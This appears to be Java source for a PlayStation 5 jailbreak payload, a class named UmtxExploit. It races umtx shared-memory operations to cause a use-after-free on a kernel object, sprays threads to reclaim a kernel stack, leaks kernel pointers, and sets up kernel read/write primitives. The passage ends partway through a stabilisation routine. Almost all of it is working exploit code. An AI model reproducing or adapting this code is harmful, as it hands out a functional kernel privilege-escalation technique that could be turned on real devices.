package org.ps5jb.client.payloads.umtx.impl1;

import java.util.List;
import java.util.Set;
import java.util.Collection;
import org.ps5jb.client.payloads.umtx.common.KernelStabilizer;
import org.ps5jb.sdk.include.sys.errno.OutOfMemoryException;
import org.ps5jb.sdk.include.sys.errno.InvalidValueException;
import org.ps5jb.sdk.include.sys.errno.BadFileDescriptorException;
import org.ps5jb.sdk.core.SdkSoftwareVersionUnsupportedException;
import org.ps5jb.client.payloads.umtx.common.KernelStackMarkerOffsets;
import org.ps5jb.sdk.core.kernel.KernelPointer;
import org.ps5jb.sdk.core.kernel.KernelAccessorIPv6;
import org.ps5jb.client.payloads.umtx.common.KernelOffsetsCalculator;
import org.ps5jb.loader.KernelAccessor;
import org.ps5jb.loader.KernelReadWrite;
import org.ps5jb.client.payloads.umtx.common.KernelAccessorSlow;
import org.ps5jb.client.payloads.umtx.common.KernelAddressClassifier;
import org.ps5jb.sdk.core.AbstractPointer;
import org.ps5jb.sdk.core.SdkRuntimeException;
import org.ps5jb.sdk.include.machine.Param;
import org.ps5jb.sdk.include.sys.errno.NotFoundException;
import java.util.ArrayList;
import org.ps5jb.sdk.include.sys.mman.MappingFlag;
import org.ps5jb.sdk.include.sys.mman.ProtectionFlag;
import org.ps5jb.sdk.include.sys.fcntl.OpenFlag;
import java.util.HashSet;
import java.util.Arrays;
import java.util.concurrent.atomic.AtomicInteger;
import java.util.concurrent.atomic.AtomicBoolean;
import org.ps5jb.sdk.include.sys.timeval.TimevalType;
import org.ps5jb.sdk.core.Pointer;
import org.ps5jb.sdk.core.SdkException;
import org.ps5jb.loader.Status;
import org.ps5jb.client.payloads.umtx.common.LoggingConfiguration;
import org.ps5jb.client.payloads.umtx.common.DebugStatus;
import org.ps5jb.sdk.include.sys.Umtx;
import org.ps5jb.sdk.include.sys.FCntl;
import org.ps5jb.sdk.include.sys.MMan;
import org.ps5jb.sdk.include.sys.RtPrio;
import org.ps5jb.sdk.include.sys.CpuSet;
import org.ps5jb.sdk.include.UniStd;
import org.ps5jb.sdk.include.ErrNo;
import org.ps5jb.sdk.lib.LibKernel;

public class UmtxExploit implements Runnable
{
    State state;
    private static final long KERNEL_STACK_SIZE;
    private static final long SIZE_PIPEBUF = 24L;
    private static final long SIZE_STAT = 256L;
    private static final long OFFSET_STAT_ST_SIZE = 72L;
    private final LibKernel libKernel;
    private final ErrNo errNo;
    private final UniStd uniStd;
    private final CpuSet cpuSet;
    private final RtPrio rtPrio;
    private final MMan mman;
    private final FCntl fcntl;
    private final Umtx umtx;
    
    public UmtxExploit() {
        this.libKernel = new LibKernel();
        this.errNo = new ErrNo(this.libKernel);
        this.uniStd = new UniStd(this.libKernel);
        this.cpuSet = new CpuSet(this.libKernel);
        this.rtPrio = new RtPrio(this.libKernel);
        this.mman = new MMan(this.libKernel);
        this.fcntl = new FCntl(this.libKernel);
        this.umtx = new Umtx(this.libKernel);
        DebugStatus.level = DebugStatus.Level.INFO;
    }
    
    public void run() {
        final LoggingConfiguration loggingUi = LoggingConfiguration.createComponent();
        if (!loggingUi.render()) {
            DebugStatus.error("UMTX execution aborted");
            return;
        }
        DebugStatus.error("Running the exploit, it may take 20 seconds or 10 minutes. Please be patient...");
        final Runnable mainJob = this::exploit;
        mainJob.run();
    }
    
    public void exploit() {
        this.state = new State();
        try {
            DebugStatus.info("Process ID: " + this.libKernel.getpid());
            if (!this.prepareExploit()) {
                DebugStatus.error("Preparing for exploitation failed");
                return;
            }
            boolean exploited = false;
            for (int i = 1; i <= 100000; ++i) {
                DebugStatus.error("Exploitation attempt #" + i);
                if (this.initialExploit()) {
                    DebugStatus.notice("Doing post-exploitation");
                    if (this.postExploit()) {
                        exploited = true;
                    }
                    else {
                        DebugStatus.notice("Post-exploitation failed");
                    }
                }
                else {
                    if (DebugStatus.isNoticeEnabled()) {
                        DebugStatus.notice("Exploitation attempt #" + i + " failed");
                    }
                    this.finishWorkingThreads();
                }
                if (exploited) {
                    break;
                }
                System.gc();
                this.sleep(50L);
            }
            if (this.state.targetReclaimJob != null) {
                DebugStatus.info("Terminating reclaim job");
                this.state.targetReclaimJob.getCommandProcessor().cmd.set(3);
                try {
                    this.state.targetReclaimThread.join();
                }
                catch (final InterruptedException ex) {}
                this.state.targetReclaimThread = null;
                this.state.targetReclaimJob = null;
                DebugStatus.notice("Reclaim job ended");
            }
        }
        catch (final SdkException | RuntimeException | Error e) {
            Status.printStackTrace(e.getMessage(), e);
        }
        finally {
            CheckMemoryPipe.getInstance().free();
            this.state.free();
            this.state = null;
        }
        this.libKernel.closeLibrary();
        DebugStatus.info("Exploit exiting");
    }
    
    private boolean prepareExploit() throws SdkException {
        final long scratchBufferSize = 120L + 8L * Config.MAX_SPRAY_MUTEXES_PER_THREAD * 2L + 0L + 256L + 16L + 8L + Config.MAX_RECLAIM_THREAD_NAME_SIZE + 16L * Config.MAX_RECLAIM_THREADS;
        this.state.scratchBufferAddress = Pointer.calloc(scratchBufferSize);
        this.state.ioVecAddress = this.state.scratchBufferAddress.inc(0L);
        this.state.uioAddress = this.state.ioVecAddress.inc(16L);
        this.state.primarySharedMemoryKeyAddress = this.state.uioAddress.inc(48L);
        this.state.secondarySharedMemoryKeyAddress = this.state.primarySharedMemoryKeyAddress.inc(8L);
        this.state.extraSharedMemoryKeyAddress = this.state.secondarySharedMemoryKeyAddress.inc(8L * Config.MAX_SPRAY_MUTEXES_PER_THREAD * 2L);
        this.state.statAddress = this.state.extraSharedMemoryKeyAddress.inc(0L);
        this.state.timeoutAddress = new TimevalType(this.state.statAddress.inc(256L));
        this.state.markerPatternAddress = this.state.timeoutAddress.getPointer().inc(16L);
        this.state.threadNameAddress = this.state.markerPatternAddress.inc(8L);
        this.state.reclaimJobStatesAddress = this.state.threadNameAddress.inc(Config.MAX_RECLAIM_THREAD_NAME_SIZE);
        this.state.raceDoneFlag = new AtomicBoolean();
        this.state.readyFlag = new AtomicBoolean();
        this.state.destroyFlag = new AtomicBoolean();
        this.state.sprayFlag = new AtomicBoolean();
        this.state.checkDoneFlag = new AtomicBoolean();
        this.state.doneFlag = new AtomicBoolean();
        this.state.numReadyThreads = new AtomicInteger();
        this.state.numCompletedThreads = new AtomicInteger();
        this.state.numFinishedThreads = new AtomicInteger();
        this.state.numDestructions = new AtomicInteger();
        this.state.numSprays = new AtomicInteger();
        this.state.initialOriginalDescriptor = -1;
        this.state.originalDescriptor = -1;
        this.state.lookupDescriptor = -1;
        this.state.winnerDescriptor = -1;
        Arrays.fill(this.state.reclaimDescriptors = new int[2 * Config.MAX_SPRAY_MUTEXES_PER_THREAD], -1);
        Arrays.fill(this.state.extraDescriptors = new int[0], -1);
        this.state.destroyerThreadIndex = -1;
        this.state.usedDescriptors = (Set)new HashSet();
        this.state.mappedKernelStackAddresses = (Set)new HashSet();
        this.state.mappedReclaimKernelStackAddress = Pointer.NULL;
        this.state.initialMainThreadAffinity = this.cpuSet.getCurrentThreadAffinity();
        this.state.markerPatternAddress.write4(4919);
        final int[] dummyDescriptors = new int[Config.MAX_DUMMY_SHARED_MEMORY_OBJECTS];
        final long mappedSize = UmtxExploit.KERNEL_STACK_SIZE;
        for (int i = 0; i < dummyDescriptors.length; ++i) {
            DebugStatus.debug("Creating dummy shared memory object #" + i);
            int descriptor = this.mman.sharedMemoryOpenAnonymous(438, OpenFlag.O_RDWR, OpenFlag.O_CREAT);
            DebugStatus.debug("Descriptor of dummy shared memory object #" + i + ": " + descriptor);
            DebugStatus.debug("Truncating dummy shared memory object #" + i);
            this.uniStd.ftruncate(descriptor, mappedSize);
            DebugStatus.debug("Mapping memory of dummy shared memory object #" + i);
            final Pointer address = this.mman.memoryMap(Pointer.NULL, mappedSize, new ProtectionFlag[] { ProtectionFlag.PROT_READ, ProtectionFlag.PROT_WRITE }, new MappingFlag[] { MappingFlag.MAP_SHARED }, descriptor, 0L);
            if (!address.equals(Pointer.NULL)) {
                DebugStatus.debug("Touching dummy shared memory object #" + i + " at " + address);
                address.write4(i);
                dummyDescriptors[i] = descriptor;
                descriptor = -1;
                DebugStatus.debug("Unmapping memory of dummy shared memory object #" + i);
                this.mman.memoryUnmap(address, mappedSize);
            }
            else {
                DebugStatus.error("Mapping memory of dummy shared memory object #" + i + " failed");
            }
            if (descriptor != -1) {
                DebugStatus.debug("Closing descriptor #" + descriptor + " of dummy shared memory object #" + i);
                this.fcntl.close(descriptor);
                dummyDescriptors[i] = -1;
            }
        }
        for (int i = 0; i < dummyDescriptors.length; ++i) {
            final int descriptor = dummyDescriptors[i];
            if (descriptor != -1) {
                DebugStatus.debug("Closing descriptor #" + descriptor + " of dummy shared memory object #" + i);
                this.fcntl.close(descriptor);
                dummyDescriptors[i] = -1;
            }
        }
        this.state.destroyerThreads = (List)new ArrayList();
        this.state.reclaimJobs = (List)new ArrayList();
        this.state.reclaimThreads = (List)new ArrayList();
        this.state.timeoutAddress.setSec(0L);
        this.state.timeoutAddress.setUsec(500000L);
        this.cpuSet.setCurrentThreadAffinity(this.state.MAIN_THREAD_CORES);
        return true;
    }
    
    private void resetState() {
        this.state.raceDoneFlag.set(false);
        this.state.readyFlag.set(false);
        this.state.destroyFlag.set(false);
        this.state.sprayFlag.set(false);
        this.state.checkDoneFlag.set(false);
        this.state.doneFlag.set(false);
        this.state.numReadyThreads.set(0);
        this.state.numCompletedThreads.set(0);
        this.state.numFinishedThreads.set(0);
        this.state.numDestructions.set(0);
        this.state.numSprays.set(0);
        this.state.originalDescriptor = -1;
        this.state.lookupDescriptor = -1;
        this.state.winnerDescriptor = -1;
        Arrays.fill(this.state.reclaimDescriptors, -1);
        Arrays.fill(this.state.extraDescriptors, -1);
        this.state.destroyerThreadIndex = -1;
    }
    
    private void cleanupState() {
        for (int i = 0; i < this.state.reclaimDescriptors.length; ++i) {
            final int descriptor = this.state.reclaimDescriptors[i];
            if (descriptor != -1) {
                DebugStatus.debug("Closing descriptor #" + descriptor + " of reclaim shared memory object #" + i);
                try {
                    this.fcntl.close(descriptor);
                }
                catch (final SdkException e) {
                    DebugStatus.error("Failed to close descriptor #" + descriptor);
                }
                this.state.reclaimDescriptors[i] = -1;
            }
        }
        if (this.state.lookupDescriptor != -1 && !this.state.usedDescriptors.contains((Object)new Integer(this.state.lookupDescriptor))) {
            DebugStatus.debug("Closing lookup descriptor #" + this.state.lookupDescriptor + " of primary shared memory object");
            try {
                this.fcntl.close(this.state.lookupDescriptor);
            }
            catch (final SdkException e2) {
                DebugStatus.error("Failed to close lookup descriptor #" + this.state.lookupDescriptor);
            }
            this.state.lookupDescriptor = -1;
        }
        DebugStatus.debug("Attempting to destroy secondary user mutexes");
        for (int i = 0; i < 2 * Config.MAX_SPRAY_MUTEXES_PER_THREAD; ++i) {
            try {
                this.umtx.userMutexDestroy(this.state.secondarySharedMemoryKeyAddress.inc(i * 8L));
            }
            catch (final NotFoundException ex) {}
            catch (final SdkException e3) {
                DebugStatus.error("Failed to destroy secondary user mutex " + i, (Throwable)e3);
            }
        }
        DebugStatus.debug("Attempting to destroy primary user mutex");
        try {
            this.umtx.userMutexDestroy(this.state.primarySharedMemoryKeyAddress);
        }
        catch (final NotFoundException ex2) {}
        catch (final SdkException e2) {
            DebugStatus.error("Failed to destroy primary user mutex", (Throwable)e2);
        }
        for (int i = 0; i < this.state.extraDescriptors.length; ++i) {
            final int descriptor = this.state.extraDescriptors[i];
            if (descriptor != -1) {
                try {
                    this.umtx.userMutexDestroy(this.state.extraSharedMemoryKeyAddress.inc(i * 8L));
                }
                catch (final SdkException e) {
                    DebugStatus.error("Failed to destroy extra shm " + this.state.extraSharedMemoryKeyAddress.inc(i * 8L));
                }
                DebugStatus.debug("Closing extra descriptor #" + descriptor);
                try {
                    this.fcntl.close(descriptor);
                }
                catch (final SdkException e) {
                    DebugStatus.error("Failed to close extra descriptor #" + descriptor);
                }
                this.state.extraDescriptors[i] = -1;
            }
        }
    }
    
    private int checkForCorruption() throws SdkException {
        if (this.state.originalDescriptor == -1) {
            DebugStatus.error("Original descriptor of primary shared memory object not found");
            return -1;
        }
        DebugStatus.notice("Original descriptor of primary shared memory object: " + this.state.originalDescriptor);
        if (this.state.lookupDescriptor == -1) {
            DebugStatus.notice("Lookup descriptor of primary shared memory object not found");
            return -1;
        }
        DebugStatus.notice("Lookup descriptor of primary shared memory object: " + this.state.lookupDescriptor);
        final long size = this.getFileSize(this.state.lookupDescriptor);
        DebugStatus.debug("Size of primary shared memory object: 0x" + Long.toHexString(size));
        final int descriptor = (int)Param.atop(size);
        if (descriptor > 1023) {
            DebugStatus.error("Calculated descriptor is too large: #" + descriptor);
            return -1;
        }
        DebugStatus.notice("Calculated descriptor #" + descriptor);
        if (descriptor != this.state.originalDescriptor && descriptor != this.state.lookupDescriptor) {
            DebugStatus.info("Got mismatch of descriptors!");
            return descriptor;
        }
        return -1;
    }
    
    private boolean checkMemoryAccess(final Pointer ptr) {
        return CheckMemoryPipe.getInstance().checkMemoryAccessible(ptr);
    }
    
    private long getFileSize(final int fd) throws SdkException {
        final int ret = this.libKernel.fstat(fd, this.state.statAddress);
        if (ret == -1) {
            throw this.errNo.getLastException(this.libKernel.getClass(), "fstat", new Object[0]);
        }
        return this.state.statAddress.read8(72L);
    }
    
    void sleep(final long millis) {
        try {
            Thread.sleep(millis);
        }
        catch (final InterruptedException ex) {}
    }
    
    void thread_yield() {
        Thread.yield();
    }
    
    private boolean initialExploit() throws SdkException {
        this.state.stackDataBuffer = null;
        this.resetState();
        DebugStatus.notice("Creating destroyer threads");
        for (int i = 0; i < 2; ++i) {
            DebugStatus.trace("Creating destroyer thread #" + i);
            final DestroyerJob destroyerJob = new DestroyerJob(i, this.state);
            final Thread thread = new Thread((Runnable)destroyerJob, destroyerJob.getJobName());
            this.state.destroyerThreads.add((Object)thread);
        }
        DebugStatus.notice("Creating lookup thread");
        final LookupJob lookupJob = new LookupJob(this.state);
        this.state.lookupThread = new Thread((Runnable)lookupJob, lookupJob.getJobName());
        for (int j = 0; j < 2; ++j) {
            final Thread thread = (Thread)this.state.destroyerThreads.get(j);
            DebugStatus.trace("Starting destroyer thread #" + j);
            thread.start();
        }
        DebugStatus.debug("Starting lookup thread");
        this.state.lookupThread.start();
        DebugStatus.debug("Creating reclaim threads");
        for (int j = 0; j < Config.MAX_RECLAIM_THREADS; ++j) {
            DebugStatus.trace("Creating reclaim thread #" + j);
            final ReclaimJob reclaimJob = new ReclaimJob(j, this.state);
            this.state.reclaimJobs.add((Object)reclaimJob);
            final Thread thread2 = new Thread((Runnable)reclaimJob, reclaimJob.getJobName());
            this.state.reclaimThreads.add((Object)thread2);
        }
        this.sleep(50L);
        DebugStatus.notice("Resetting state");
        this.resetState();
        int numIterations = 0;
        boolean isLastIteration = false;
        while (!this.state.raceDoneFlag.get() && !isLastIteration) {
            isLastIteration = (++numIterations >= 50000);
            if (numIterations % 200 == 0) {
                DebugStatus.error("Racing iteration #" + numIterations);
            }
            DebugStatus.debug("Starting loop");
            DebugStatus.debug("Creating primary user mutex");
            int descriptor = this.umtx.userMutexCreate(this.state.primarySharedMemoryKeyAddress);
            DebugStatus.notice("Original descriptor of primary shared memory object: " + descriptor);
            this.state.originalDescriptor = descriptor;
            if (this.state.initialOriginalDescriptor == -1) {
                this.state.initialOriginalDescriptor = descriptor;
            }
            DebugStatus.debug("Truncating primary shared memory object");
            this.truncateSharedMemorySpecial(descriptor);
            DebugStatus.debug("Closing original descriptor #" + descriptor + " of primary shared memory object");
            this.fcntl.close(descriptor);
            DebugStatus.notice("We are ready to start");
            this.state.readyFlag.set(true);
            this.waitForCounter(this.state.numReadyThreads, 3, " threads to be ready");
            this.state.readyFlag.set(false);
            this.state.numReadyThreads.set(0);
            this.state.destroyFlag.set(true);
            this.waitForCounter(this.state.numCompletedThreads, 3, " threads to be completed");
            final int count = this.state.numDestructions.get();
            DebugStatus.notice("Number of successful destructions: " + count);
            this.state.sprayFlag.set(true);
            this.waitForCounter(this.state.numSprays, 2, " threads to finish spraying");
            DebugStatus.notice("Checking for shared memory object corruption");
            descriptor = this.checkForCorruption();
            if (descriptor != -1) {
                DebugStatus.info("Checking succeeded, winner descriptor of shared memory object: " + descriptor);
                this.state.winnerDescriptor = descriptor;
            }
            else {
                DebugStatus.notice("Checking failed");
            }
            if (this.state.lookupDescriptor != -1 && this.state.numDestructions.get() >= 2) {
                this.state.usedDescriptors.add((Object)new Integer(this.state.lookupDescriptor));
            }
            for (int k = 0; k < this.state.reclaimDescriptors.length; ++k) {
                descriptor = this.state.reclaimDescriptors[k];
                if (descriptor != -1) {
                    if (this.state.winnerDescriptor != -1 && this.state.winnerDescriptor == descriptor) {
                        this.state.destroyerThreadIndex = k % 2;
                    }
                    else {
                        DebugStatus.debug("Closing descriptor #" + descriptor + " of reclaim shared memory object #" + k);
                        this.fcntl.close(descriptor);
                        this.state.reclaimDescriptors[k] = -1;
                    }
                }
            }
            this.state.destroyFlag.set(false);
            this.state.checkDoneFlag.set(true);
            if (count == 2 && this.state.winnerDescriptor != -1) {
                if (DebugStatus.isNoticeEnabled()) {
                    DebugStatus.notice("Truncating shared memory object with descriptor #" + this.state.winnerDescriptor);
                    this.uniStd.ftruncate(this.state.winnerDescriptor, UmtxExploit.KERNEL_STACK_SIZE);
                    final long lookupSize = this.getFileSize(this.state.lookupDescriptor);
                    DebugStatus.notice("Size of shared memory object with lookup descriptor #" + this.state.lookupDescriptor + ": 0x" + Long.toHexString(lookupSize));
                    final long winnerSize = this.getFileSize(this.state.winnerDescriptor);
                    DebugStatus.notice("Size of shared memory object with winner descriptor #" + this.state.winnerDescriptor + ": 0x" + Long.toHexString(winnerSize));
                }
                DebugStatus.info("We have some result from destroyer #" + this.state.destroyerThreadIndex + "!!!");
                this.state.raceDoneFlag.set(true);
            }
            else if (isLastIteration) {
                this.state.raceDoneFlag.set(true);
            }
            this.waitForCounter(this.state.numReadyThreads, 3, " threads to be ready for finish");
            this.state.doneFlag.set(true);
            this.waitForCounter(this.state.numFinishedThreads, 3, " threads to be finished");
            if (this.state.winnerDescriptor == -1) {
                DebugStatus.debug("Cleaning up state");
                this.cleanupState();
                if (!isLastIteration) {
                    DebugStatus.debug("Resetting state");
                    this.resetState();
                }
            }
            DebugStatus.debug("Finishing loop");
        }
        DebugStatus.notice("Recovering initial CPU affinity mask for main thread");
        this.cpuSet.setCurrentThreadAffinity(this.state.initialMainThreadAffinity);
        final boolean gotResult = this.state.winnerDescriptor != -1;
        this.state.raceDoneFlag.set(true);
        if (gotResult) {
            DebugStatus.notice("Original descriptor of primary shared memory object: " + this.state.originalDescriptor);
            DebugStatus.notice("Winner descriptor of primary shared memory object: " + this.state.winnerDescriptor);
            if (this.state.lookupDescriptor == -1) {
                DebugStatus.notice("Racing done but lookup descriptor not found");
            }
            else {
                DebugStatus.notice("Lookup descriptor of primary shared memory object: " + this.state.lookupDescriptor);
            }
            DebugStatus.info("Got memory corruption after " + numIterations + " iterations");
        }
        else {
            DebugStatus.info("No memory corruption even after " + numIterations + " iterations");
        }
        return gotResult;
    }
    
    private void finishWorkingThreads() {
        this.state.destroyFlag.set(true);
        this.sleep(50L);
        if (this.state.lookupThread != null) {
            DebugStatus.trace("Joining lookup thread");
            try {
                this.state.lookupThread.join();
            }
            catch (final InterruptedException ex) {}
            DebugStatus.notice("Unsetting lookup thread");
            this.state.lookupThread = null;
        }
        if (!this.state.destroyerThreads.isEmpty()) {
            DebugStatus.notice("Joining destroyer threads");
            for (int i = 0; i < this.state.destroyerThreads.size(); ++i) {
                final Thread thread = (Thread)this.state.destroyerThreads.get(i);
                DebugStatus.trace("Joining destroyer thread #" + i);
                try {
                    thread.join();
                }
                catch (final InterruptedException ex2) {}
            }
            DebugStatus.notice("Clearing destroyer thread list");
            this.state.destroyerThreads.clear();
        }
    }
    
    private boolean postExploit() throws SdkException {
        if (this.state.destroyerThreadIndex == -1) {
            DebugStatus.error("No destroyer thread index found");
            return false;
        }
        this.finishWorkingThreads();
        for (int i = 0; i < this.state.extraDescriptors.length; ++i) {
            if (DebugStatus.isNoticeEnabled()) {
                DebugStatus.notice("Creating extra user mutex #" + i);
            }
            this.state.extraDescriptors[i] = this.umtx.userMutexCreate(this.state.extraSharedMemoryKeyAddress.inc(i * 8L));
            if (DebugStatus.isNoticeEnabled()) {
                DebugStatus.notice("Descriptor of extra shared memory object #" + i + ": " + this.state.extraDescriptors[i]);
            }
        }
        if (this.state.winnerDescriptor != -1) {
            DebugStatus.notice("Closing winner descriptor #" + this.state.winnerDescriptor + " of primary shared memory object");
            this.fcntl.close(this.state.winnerDescriptor);
            this.state.winnerDescriptor = -1;
        }
        DebugStatus.notice("Mapping memory of shared memory object with lookup descriptor #" + this.state.lookupDescriptor);
        Pointer mappedKernelStackAddress = this.mman.memoryMap(Pointer.NULL, UmtxExploit.KERNEL_STACK_SIZE, new ProtectionFlag[] { ProtectionFlag.PROT_NONE }, new MappingFlag[] { MappingFlag.MAP_SHARED }, this.state.lookupDescriptor, 0L);
        DebugStatus.info("Mapped address of potential kernel stack: " + mappedKernelStackAddress + ". Size: 0x" + Long.toHexString(UmtxExploit.KERNEL_STACK_SIZE));
        this.state.mappedKernelStackAddresses.add((Object)mappedKernelStackAddress);
        DebugStatus.notice("Protecting mapped memory of potential kernel stack");
        try {
            this.mman.memoryProtect(mappedKernelStackAddress, UmtxExploit.KERNEL_STACK_SIZE, ProtectionFlag.PROT_READ, ProtectionFlag.PROT_WRITE);
        }
        catch (final SdkException | SdkRuntimeException e) {
            DebugStatus.error("Protecting mapped memory of potential kernel stack failed");
            this.mman.memoryUnmap(mappedKernelStackAddress, UmtxExploit.KERNEL_STACK_SIZE);
            mappedKernelStackAddress = Pointer.NULL;
        }
        long markerOffset = -1L;
        KernelAddressClassifier classifier = null;
        if (!Pointer.NULL.equals(mappedKernelStackAddress)) {
            this.state.destroyFlag.set(false);
            final long scanSize = 4096L;
            final Pointer scanAddress = mappedKernelStackAddress.inc(UmtxExploit.KERNEL_STACK_SIZE - 4096L);
            this.state.stackDataBuffer = new MemoryBuffer(scanAddress, 4064L);
            DebugStatus.info("Starting " + Config.MAX_RECLAIM_THREADS + " reclaim threads");
            for (int j = 0; j < Config.MAX_RECLAIM_THREADS; ++j) {
                final Thread thread = (Thread)this.state.reclaimThreads.get(j);
                DebugStatus.trace("Starting reclaim thread #" + j);
                thread.start();
            }
            DebugStatus.notice("Reclaim threads started");
            this.state.readyFlag.set(true);
            DebugStatus.info("Checking if reclaimed memory belongs to controlled thread");
            boolean accessChecked = false;
            for (int k = 0; k < 2; ++k) {
                this.sleep(100L);
                if (!accessChecked) {
                    if (!this.checkMemoryAccess(mappedKernelStackAddress)) {
                        DebugStatus.error("Reclaimed memory access check failed.");
                        DebugStatus.notice("Unmapping memory of potential kernel stack: " + mappedKernelStackAddress);
                        try {
                            this.mman.memoryUnmap(mappedKernelStackAddress, UmtxExploit.KERNEL_STACK_SIZE);
                        }
                        catch (final SdkException e2) {
                            DebugStatus.error("Unmapping of potential kernel stack memory failed.", (Throwable)e2);
                        }
                        mappedKernelStackAddress = Pointer.NULL;
                        break;
                    }
                    accessChecked = true;
                }
                if (k == 0) {
                    final long count = this.state.stackDataBuffer.getSize() / 8L;
                    boolean allZeros = true;
                    for (int l = 0; l < count; ++l) {
                        final long value = this.state.stackDataBuffer.read64(l * 8L);
                        if (value != 0L) {
                            DebugStatus.notice("Found some kernel stack data at 0x" + Long.toHexString(l * 8L) + ": 0x" + Long.toHexString(value));
                            allZeros = false;
                            break;
                        }
                    }
                    if (!allZeros) {
                        DebugStatus.info("Initial leaked kernel stack data");
                        this.state.stackDataBuffer.dump();
                    }
                    else {
                        DebugStatus.notice("Kernel stack is all zeroes");
                    }
                }
                markerOffset = this.state.stackDataBuffer.find(this.state.markerPatternAddress, 2);
                if (markerOffset != -1L) {
                    DebugStatus.info("Found marker pattern in kernel stack at 0x" + Long.toHexString(markerOffset));
                    if (k != 0) {
                        DebugStatus.info("Final leaked kernel stack data:");
                        this.state.stackDataBuffer.dump();
                    }
                    DebugStatus.notice("Classifying leaked kernel addresses");
                    classifier = KernelAddressClassifier.fromBuffer(new Pointer(this.state.stackDataBuffer.getAddr(), new Long(this.state.stackDataBuffer.getSize())));
                    final int reclaimMarkerWord = this.state.stackDataBuffer.read16(markerOffset + 2L) & 0xFFFF;
                    final int reclaimJobIndex = reclaimMarkerWord - 65 - 1;
                    DebugStatus.info("Determined reclaim job index: " + reclaimJobIndex);
                    if (reclaimJobIndex >= 0 && reclaimJobIndex < Config.MAX_RECLAIM_THREADS) {
                        final ReclaimJob job = (ReclaimJob)this.state.reclaimJobs.get(reclaimJobIndex);
                        final String jobName = job.getJobName();
                        DebugStatus.info("Found reclaim thread '" + jobName + "' using " + (k + 1) + " attempts");
                        this.state.stackDataBuffer.snapshot();
                        this.state.mappedReclaimKernelStackAddress = mappedKernelStackAddress;
                        job.setTarget(true);
                        break;
                    }
                    DebugStatus.notice("Job index is bad, continuing checking");
                }
            }
            if (!Pointer.NULL.equals(this.state.mappedReclaimKernelStackAddress)) {
                DebugStatus.notice("Resetting ready flag");
                this.state.readyFlag.set(false);
            }
            else {
                DebugStatus.info("Reclaim thread not found");
            }
            this.state.destroyFlag.set(true);
            this.thread_yield();
            DebugStatus.notice("Joining reclaim threads");
            for (int k = 0; k < this.state.reclaimThreads.size(); ++k) {
                final Thread thread2 = (Thread)this.state.reclaimThreads.get(k);
                final ReclaimJob job2 = (ReclaimJob)this.state.reclaimJobs.get(k);
                if (!job2.isTarget()) {
                    DebugStatus.trace("Joining reclaim thread #" + k);
                    try {
                        thread2.join();
                    }
                    catch (final InterruptedException ex) {}
                }
                else {
                    DebugStatus.notice("Skipping target reclaim thread #" + k);
                    this.state.targetReclaimThread = thread2;
                    this.state.targetReclaimJob = job2;
                }
            }
            this.state.reclaimThreads.clear();
            this.state.reclaimJobs.clear();
        }
        else {
            this.state.destroyFlag.set(true);
        }
        final boolean succeeded = !Pointer.NULL.equals(this.state.mappedReclaimKernelStackAddress);
        if (succeeded) {
            DebugStatus.debug("Setting ready flag");
            this.state.readyFlag.set(true);
            this.sleep(50L);
            DebugStatus.notice("Waiting for command processor to start up");
            while (!this.state.targetReclaimJob.isCommandProccesorRunning()) {
                this.sleep(1000L);
            }
            DebugStatus.notice("Done waiting for command processor to start up");
            KernelReadWrite.setAccessor((KernelAccessor)new KernelAccessorSlow(this.state.targetReclaimJob.getCommandProcessor(), this.state.mappedReclaimKernelStackAddress));
            DebugStatus.info("Registered slow kernel r/w accessor");
            final int swVer = this.libKernel.getSystemSoftwareVersion();
            final KernelOffsetsCalculator offsetCalc = new KernelOffsetsCalculator();
            if (classifier == null || !offsetCalc.calculate(swVer, classifier, this.state.targetReclaimJob.getJobName())) {
                throw new SdkRuntimeException("Unable to confirm reclaim thread index from its name. A system crash is imminent");
            }
            this.state.threadAddress = offsetCalc.threadAddress;
            this.state.processAddress = offsetCalc.processAddress;
            this.state.ofilesAddress = offsetCalc.processOpenFilesAddress;
            this.state.kbaseAddress = offsetCalc.kernelAddressBase;
            KernelReadWrite.setAccessor((KernelAccessor)new KernelAccessorIPv6(this.state.ofilesAddress, this.state.kbaseAddress));
            DebugStatus.info("Registered IPv6-based kernel r/w accessor");
            this.stabilize();
            DebugStatus.info("Thread address: " + this.state.threadAddress);
            DebugStatus.info("This proc address: " + this.state.processAddress);
            DebugStatus.info("Kernel allproc address: " + offsetCalc.allProcAddress);
            if (!KernelPointer.NULL.equals(offsetCalc.kernelAddressBase)) {
                DebugStatus.info("Kernel data address determined as " + offsetCalc.kernelDataBase);
                DebugStatus.info("Kernel base address determined as " + this.state.kbaseAddress);
                try {
                    final KernelStackMarkerOffsets kstackOff = new KernelStackMarkerOffsets(swVer);
                    final long retOffset = markerOffset + kstackOff.OFFSET_RET_FROM_MARKER;
                    final KernelPointer retValue = KernelPointer.valueOf(this.state.stackDataBuffer.readSnapshot64(retOffset));
                    final KernelPointer calcKbaseAddress = retValue.inc(kstackOff.OFFSET_KBASE_FROM_RET);
                    if (!calcKbaseAddress.equals(this.state.kbaseAddress)) {
                        DebugStatus.info("Calculated base address from the stack marker differs: " + calcKbaseAddress + " (based on value " + retValue + " from kstack offset 0x" + Long.toHexString(retOffset));
                    }
                    else {
                        DebugStatus.info("Kernel base address matches the base address calculated from the stack marker");
                    }
                }
                catch (final SdkSoftwareVersionUnsupportedException e3) {
                    DebugStatus.info("Kernel base address cannot be confirmed from the stack marker for the current firmware version");
                }
            }
            else {
                DebugStatus.info("Kernel base address cannot be determined for the current firmware version. Address of allproc is saved in system property: org.ps5jb.client.KERNEL_DATA_POINTER");
                System.setProperty("org.ps5jb.client.KERNEL_DATA_POINTER", Long.toString(offsetCalc.allProcAddress.addr()));
            }
            this.state.stackDataBuffer.clearSnapshot();
        }
        else {
            this.state.targetReclaimThread = null;
            this.state.targetReclaimJob = null;
        }
        System.gc();
        DebugStatus.info("JVM garbage collection completed");
        return succeeded;
    }
    
    protected void waitForCounter(final AtomicInteger value, final int threshold, final String text) {
        int count;
        while (true) {
            count = value.get();
            if (count >= threshold) {
                break;
            }
            if (DebugStatus.isTraceEnabled()) {
                DebugStatus.trace("Waiting for" + text + " (" + count + "/" + threshold);
            }
            this.thread_yield();
        }
        if (DebugStatus.isTraceEnabled()) {
            DebugStatus.trace("Done waiting for" + text + " (" + count + "/" + threshold);
        }
    }
    
    private void truncateSharedMemorySpecial(final int descriptor) throws BadFileDescriptorException, InvalidValueException, OutOfMemoryException {
        this.uniStd.ftruncate(descriptor, Param.ptoa(descriptor));
    }
    
    public void stabilize() throws SdkException {
        final KernelStabilizer stabilizer = new KernelStabilizer();
        DebugStatus.info("Fixing up shared memory object file");
